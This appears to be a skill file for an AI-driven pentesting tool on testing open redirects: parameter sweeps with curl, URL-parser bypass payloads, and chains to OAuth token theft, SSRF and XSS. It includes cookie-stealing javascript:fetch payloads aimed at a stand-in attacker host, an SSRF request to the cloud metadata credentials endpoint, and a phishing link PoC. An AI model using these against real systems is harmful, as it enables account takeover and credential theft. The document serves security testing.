---
name: open-redirect-testing
description: Test for unvalidated redirects — URL parameters, login flows, OAuth callbacks that redirect to attacker-controlled domains
origin: Vigil
vuln_class: open-redirect
---

# Open Redirect Testing

## Reality Check

Open redirect alone is typically Low severity. It becomes High/Critical when chained with: OAuth token theft (redirect_uri manipulation), XSS via `javascript:` URI, phishing from a trusted domain, or SSRF via server-side redirect following. If you find an open redirect and stop there, you have a Low. If you chain it, you have a real finding. This skill covers both discovery and the chains that make open redirects worth reporting.

## When to Activate

- Any URL parameter containing a URL or path value
- Login/logout flows with post-authentication redirects
- OAuth/SSO callback URLs (`redirect_uri`, `post_logout_redirect_uri`)
- Payment completion redirects
- Email verification links with return URLs
- Any `Location` header whose value is influenced by user input

## Tools

- `curl` (follow redirects with `-L`, inspect with `-v`)
- `vigil assess classify-payload <value> --mutations` — type the current redirect-parameter value and pull type-aware variants: for a `url`-typed value the `boundary` bucket yields `javascript:alert(1)`/`file://` scheme probes and the `format` bucket yields scheme-downgrade/quoted variants you feed into the bypass sweep (Step 2) instead of hand-typing each.
- `vigil assess anomaly-score` — when sweeping many redirect-parameter names across an endpoint (Parameter Discovery): record each response and let it rank the parameter that produced an odd response (a 3xx with an attacker `Location` where the rest 200) rather than eyeballing the loop.
- `vigil oob mint` / `vigil oob poll` — only for the **SSRF-via-server-side-redirect** chain (see Chaining): `mint` binds the nonce under a running client's interactsh id and prints the exact callback host (`$OOB_HOST`, of shape `<nonce>.<client-id>.oob.example.com`) so `poll` can correlate it — pass `--client <name>` when several clients run. Make the server-side fetcher follow your open redirect to the exact host mint prints, and `poll` to confirm the backend dereferenced it. Readiness: `vigil oob status --json`.
- Burp Suite (intercept and modify redirect parameters, observe redirect chains)
- Browser DevTools (observe client-side redirects via JavaScript)

---

## Parameter Discovery

Redirect parameters use many names. Test all of them on every endpoint that handles navigation:

**Common parameter names:**
```
redirect, url, next, return, return_to, returnTo, returnUrl, continue,
destination, dest, redir, redirect_uri, redirect_url, forward, target,
path, goto, ref, callback, cb, rurl, out, view, link, to, uri, u, r,
RelayState, SAMLRequest (SSO), post_logout_redirect_uri
```

**Discovery approach:**
```bash
# Test common redirect parameter names against a target
for param in redirect url next return return_to returnTo returnUrl continue destination dest redir redirect_uri redirect_url forward target path goto ref callback rurl out view link to uri u r; do
  resp=$(curl -s -o /dev/null -w "%{http_code}|%{redirect_url}" "https://target.example/?${param}=https://evil.example" 2>/dev/null)
  code=$(echo "$resp" | cut -d'|' -f1)
  location=$(echo "$resp" | cut -d'|' -f2)
  if [[ "$code" =~ ^3[0-9][0-9]$ ]] && echo "$location" | grep -qi "evil"; then
    echo "REDIRECT: ?${param} -> $code $location"
  fi
done
```

A literal `grep -qi "evil"` only catches the clean redirect. When the redirect is subtler (a 302 to a normalized path, a different status, or a length shift from an error page), capture one response record per parameter and rank the outlier so the odd-behaving parameter surfaces even without an `evil` substring:

```bash
for param in redirect url next return returnTo continue dest redir redirect_uri forward target goto ref callback rurl to uri u r; do
  read -r code len <<<"$(curl -s -o /dev/null -w '%{http_code} %{size_download}' "https://target.example/?${param}=https://evil.example")"
  printf '{"url":"%s","status":%s,"content_length":%s}\n' "$param" "$code" "$len"
done | vigil assess anomaly-score --top 8
```

The top-ranked record's `anomalous_attributes` (e.g. `status='302'`) is the parameter that diverged from the no-redirect baseline — investigate its `Location` header next.

**Test beyond the homepage.** Redirect parameters appear most often on:
- `/login?next=`, `/login?returnTo=`
- `/logout?redirect=`
- `/oauth/authorize?redirect_uri=`
- `/sso/callback?RelayState=`
- `/checkout/complete?return=`
- `/email/verify?continue=`
- Any 302 endpoint discovered during recon

---

## Server-Side vs Client-Side Redirects

The redirect type determines the exploitation path:

### Server-Side (HTTP 301/302/303/307/308)

The server sets the `Location` header. The browser follows it automatically. These are the classic open redirects.

- Visible in Burp/curl as a `Location` header
- Exploitable via simple link: `https://trusted.example/redirect?url=https://evil.example`
- Victim sees `trusted.example` in the link, ends up on `evil.example`
- HTTP 307/308 preserve the request method (POST redirects remain POST -- relevant for form-based CSRF chains)

### Client-Side (JavaScript)

The page loads, then JavaScript redirects. Different attack surface:

```javascript
// DOM-based redirect -- user input flows into navigation
window.location.href = new URLSearchParams(window.location.search).get('url');
window.location = document.referrer;
window.location.replace(params.get('next'));

// Meta refresh (rare, but exists in legacy apps)
// <meta http-equiv="refresh" content="0;url=USER_INPUT">

// window.open (popup-based)
window.open(params.get('target'));
```

Client-side redirects have an additional attack surface: if the input flows into `href`, `src`, `action`, or `location` without validation, `javascript:` URIs may execute -- turning a redirect into XSS.

---

## Bypass Techniques

Validation is usually present. The question is what the validation checks and how to evade it.

### Protocol-Relative URL
```
//evil.example
```
If the validator checks for `http://` or `https://` prefix but not `//`, this bypasses the check. The browser interprets `//evil.example` as the current protocol + `evil.example`.

### Userinfo Confusion (@ Sign)
```
https://trusted.example@evil.example
http://trusted.example@evil.example/path
```
The URL spec treats everything before `@` as userinfo (username). The actual host is `evil.example`. If the validator checks that the URL "contains" `trusted.example`, this passes. Most modern browsers warn about or strip userinfo in HTTP URLs, but older browsers and some HTTP clients follow them.

### Backslash Confusion
```
https://trusted.example\@evil.example
//trusted.example\@evil.example
```
Some URL parsers treat `\` as equivalent to `/`. The validator sees `trusted.example` as the host, but the browser may interpret differently depending on the parsing implementation.

### URL Encoding
```
https%3A%2F%2Fevil.example
%2f%2fevil.example
%2Fevil.example
```
Single-pass validators that check the raw parameter value miss encoded payloads. The server decodes before redirecting.

### Double Encoding
```
https%253A%252F%252Fevil.example
%252f%252fevil.example
```
When the application decodes twice (or the proxy decodes once and the app decodes again), double encoding bypasses validators that only check after the first decode.

### Null Byte
```
https://trusted.example%00.evil.example
https://trusted.example%00@evil.example
```
In some languages (C-based string handling, older PHP), the null byte terminates the string. The validator sees `trusted.example`, but the redirect target includes `.evil.example` after the null.

### Tab/Newline Injection
```
https://trusted.example%09.evil.example
https://evil.example%0d%0aX-Injected: header
```
Whitespace characters can confuse URL parsers. CRLF (`%0d%0a`) in the redirect value may inject additional headers if the server does not sanitize before setting the `Location` header (header injection).

### Subdomain Matching Bypass
```
https://evil.trusted.example
https://trustedcom.evil.example
https://evil-trusted.example
```
If the validator checks `endsWith('.trusted.example')` or `contains('trusted.example')`, these may pass. The first requires the attacker to control a subdomain (or exploit wildcard DNS). The second and third are common regex mistakes.

### Fragment/Hash
```
https://trusted.example#@evil.example
```
Some validators do not account for the fragment. Depending on parsing order, the final navigation target may differ from what the validator evaluated.

### Path Traversal in Relative Redirects
```
/redirect?url=/../../evil.example
/redirect?url=/..//evil.example
```
If the server builds the redirect URL by appending the parameter to a base path, path traversal may escape the intended domain.

### CRLF for Location Header Injection
```
/redirect?url=%0d%0aLocation:%20https://evil.example%0d%0a
```
If the redirect parameter value is placed directly into the HTTP response without sanitization, CRLF characters can inject a new `Location` header, overriding the intended redirect.

---

## Chaining: What Makes Open Redirect Valuable

### OAuth Token Theft (redirect_uri Manipulation)

The highest-value chain. OAuth flows trust the `redirect_uri` to receive authorization codes and tokens.

**Direct manipulation:**
```
https://auth.target.example/authorize?
  client_id=legit_app&
  redirect_uri=https://evil.example/callback&
  response_type=code&
  scope=openid profile
```

If the OAuth server does not strictly validate `redirect_uri`, the authorization code is sent to `evil.example`.

**Indirect via open redirect (more common, works even with strict redirect_uri validation):**
```
https://auth.target.example/authorize?
  client_id=legit_app&
  redirect_uri=https://trusted.example/redirect?url=https://evil.example&
  response_type=code&
  scope=openid profile
```

The OAuth server validates that `redirect_uri` starts with `https://trusted.example/` -- passes. The authorization code is sent to `https://trusted.example/redirect?url=https://evil.example`. The open redirect forwards the code (now in the URL as a query parameter or fragment) to `evil.example`.

**Gate question:** Does the OAuth flow send the token/code as a URL parameter (`?code=...` or `#access_token=...`)? If the code is sent as a POST body to the redirect_uri (common in authorization code flow with PKCE), the open redirect does not forward it.

### SSRF via Server-Side Redirect Following

If the server follows redirects when fetching URLs (common in webhooks, URL previews, file imports):

```
POST /api/import-url
{"url": "https://trusted.example/redirect?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

The server validates that the URL is not an internal address, fetches `https://trusted.example/redirect`, follows the 302 to the metadata endpoint, and returns the response. The open redirect acts as an SSRF gadget that bypasses URL validation.

**Confirm the server-side fetch with a callback before chasing internal targets.** Point the redirect at a minted nonce host; if the backend dereferences it, `poll` correlates the hit and proves the gadget fetches server-side (which a client-side redirect never would):

```bash
vigil oob mint --client <name> --technique ssrf --target-url "https://target/api/import-url" \
  --param url --probe-kind redirect-ssrf-gadget
# → host  <nonce>.<client-id>.oob.example.com   (= $OOB_HOST)
# Submit the import with the open redirect pointing the fetcher at the exact host mint printed ($OOB_HOST):
#   {"url": "https://trusted.example/redirect?url=http://$OOB_HOST/"}
vigil oob poll --client <name>     # matched row = the backend followed the redirect and fetched
```

A matched callback flips this from a Low standalone redirect to a confirmed SSRF gadget — now swap the redirect target to `169.254.169.254`/internal hosts. Hand this off to `agent/skills/ssrf-testing/SKILL.md` for the post-SSRF exploitation flow.

**Key requirement:** The server must follow redirects server-side (e.g., `curl -L` behavior in backend code). Client-side redirects do not help here — a minted-host callback that never fires after the import confirms the redirect is client-side only.

### XSS via javascript: URI

If the redirect parameter value flows into a JavaScript context or an HTML attribute that accepts URIs:

```javascript
// Vulnerable: user input flows into href
document.getElementById('link').href = params.get('url');
// or
window.location = params.get('redirect');
```

Payload:
```
?url=javascript:alert(document.cookie)
?redirect=javascript:fetch('https://evil.example/'+document.cookie)
```

This turns an open redirect into reflected XSS. The validator may check for `http://` and `https://` prefixes but not `javascript:`.

**Also test:** `data:text/html,<script>alert(1)</script>` and `vbscript:` (legacy IE).

### Phishing Amplification

A direct link from a trusted domain (`https://acme.example/redirect?url=https://bigcorp-login.evil.example`) is far more convincing in phishing campaigns than a naked `evil.example` link. Email filters and link scanners often trust known domains.

**Severity context:** This is Low severity as a standalone finding. Mention the phishing potential in the finding narrative but do not inflate severity based on hypothetical phishing scenarios.

---

## Testing Methodology

### Step 1: Identify Redirect Endpoints

Crawl the application and look for any endpoint that returns 3xx status codes with user-controllable `Location` headers. Also check for JavaScript redirects in page source.

### Step 2: Test Each Bypass Technique

For each redirect endpoint, iterate through bypass techniques. Order by likelihood of success. Before hand-crafting variants, pull the type-aware set for the parameter's current value so the scheme-confusion and format-confusion probes are generated for you:

```bash
vigil assess classify-payload "https://target.example/account" --mutations
```

For a `url`-typed value this returns:
- `boundary` → `http://localhost/`, `http://127.0.0.1/`, `file:///etc/passwd`, `javascript:alert(1)` — the `javascript:`/`file:` entries are your scheme-based XSS/SSRF escalation probes (see Chaining)
- `format` → the quoted and scheme-downgraded variants (`http://...`, `https:target.example/...`) that flush out parser/validator differentials

Combine these with the URL-parser-confusion variants below (the classifier covers scheme and format confusion; the `//`, `@`, backslash, and double-encoding tricks are redirect-specific and listed here):

1. Direct external URL (`https://evil.example`) -- baseline test
2. Protocol-relative (`//evil.example`) -- most commonly missed
3. URL-encoded (`%2f%2fevil.example`) -- second most common bypass
4. Userinfo (`https://trusted.example@evil.example`) -- works against "contains" validators
5. Subdomain (`https://evil.trusted.example`) -- works against "endsWith" validators
6. Double encoding (`%252f%252fevil.example`) -- works against single-decode validators
7. Backslash, null byte, tab/newline -- lower probability but worth trying
8. CRLF header injection -- test if the redirect path allows response splitting

### Step 3: Determine Chain Value

If a redirect works:
- Is this endpoint part of an OAuth flow? Check for `client_id`, `response_type`, `scope` parameters
- Is this endpoint fetched server-side by any feature (webhooks, previews, imports)?
- Does the redirect parameter flow into any HTML/JS context? (check the page source when the redirect fails or is blocked -- sometimes a failed redirect renders the URL in the page)

### Step 4: Build PoC

**Server-side redirect (phishing/OAuth PoC):**
```html
<a href="https://trusted.example/redirect?url=https://evil.example">Click to verify your account</a>
```

**OAuth token theft PoC:**
```
1. Victim clicks: https://auth.target.example/authorize?client_id=APP&redirect_uri=https://target.example/redirect?url=https://evil.example&response_type=token
2. Victim authenticates
3. Token sent to: https://target.example/redirect?url=https://evil.example#access_token=STOLEN_TOKEN
4. Open redirect forwards to: https://evil.example#access_token=STOLEN_TOKEN
5. Attacker's page reads the fragment: window.location.hash
```

**JavaScript-based redirect (XSS PoC):**
```
https://target.example/page?redirect=javascript:fetch('https://evil.example/'+document.cookie)
```

---

## What to Record

- Redirect parameter name and vulnerable endpoint
- Which bypass technique worked (and which were blocked -- shows the validator's logic)
- Whether the redirect is server-side (3xx) or client-side (JavaScript)
- Chain classification:
  - **Low** — Standalone open redirect, no meaningful chain identified
  - **Medium** — Redirect in an authenticated flow, potential phishing from trusted domain
  - **High** — OAuth redirect_uri chain with demonstrated token theft, or SSRF gadget
  - **Critical** — XSS via `javascript:` URI, or OAuth token theft to account takeover
- Working PoC link or HTML page

## Kill Signals — Stop Testing When
- All bypass techniques (13 variants) fail on all redirect parameters → validation is robust, move on
- Open redirect confirmed but no chain opportunity (no OAuth, no trusted-domain phishing value, no javascript: URI) → record as LOW and move on
- OAuth token theft chain confirmed → HIGH/CRITICAL, record immediately and stop testing other redirect params

## Escalate When
- The validator accepts any of: `//evil.example`, `/\evil.example`, `https://trusted.example.evil.example`, `https://trusted.example@evil.example`, backslash-normalization (`https:/\evil.example`), or IDN/punycode lookalikes — the parser disagrees with the browser, enumerate the full URL-parser confusion set
- The parameter is part of an OAuth `redirect_uri`, SSO `returnTo`, SAML `RelayState`, post-login `next`, or password-reset callback — token/code theft is the payoff, chain the redirect and capture the credential material delivered to the attacker origin
- A `javascript:`, `data:`, or `vbscript:` scheme is accepted (even after filtering) — this is XSS not phishing, escalate severity and enumerate sinks (`window.location`, anchor `href`, meta refresh)
- The redirect target is validated by substring/endsWith/startsWith rather than host parsing — craft `https://trusted.example.attacker.example` or `https://attacker.example/trusted.example` to confirm the parser flaw
- The redirect is server-side (302 Location) rather than client JS — server redirects carry cookies and participate in OAuth flows that client-side redirects do not, test chain value before downgrading

## Extended Resources

- `agent/references/payloads/open-redirect-payloads.md` — URL parsing confusion, protocol-relative, unicode normalization
